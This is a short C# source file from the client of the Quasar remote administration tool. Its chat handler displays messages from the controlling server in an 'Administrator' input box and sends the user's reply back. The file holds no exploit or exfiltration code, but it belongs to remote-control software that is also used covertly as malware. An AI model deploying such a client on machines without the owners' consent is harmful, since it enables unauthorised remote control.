using Quasar.Client.Controls;
using Quasar.Client.Networking;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System.Windows.Forms;

namespace Quasar.Client.Messages
{
    /// <summary>
    /// Handles chat messages from the server and sends user responses.
    /// </summary>
    public class ChatHandler : IMessageProcessor
    {
        private readonly QuasarClient _client;

        public ChatHandler(QuasarClient client)
        {
            _client = client;
        }

        public bool CanExecute(IMessage message) => message is ChatMessage chat && !chat.FromClient;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case ChatMessage chat:
                    Execute(sender, chat);
                    break;
            }
        }

        private void Execute(ISender client, ChatMessage message)
        {
            string response = string.Empty;
            if (InputBox.Show("Administrator", message.Text, ref response) == DialogResult.OK && !string.IsNullOrEmpty(response))
            {
                _client.Send(new ChatMessage { FromClient = true, Text = response });
            }
        }
    }
}
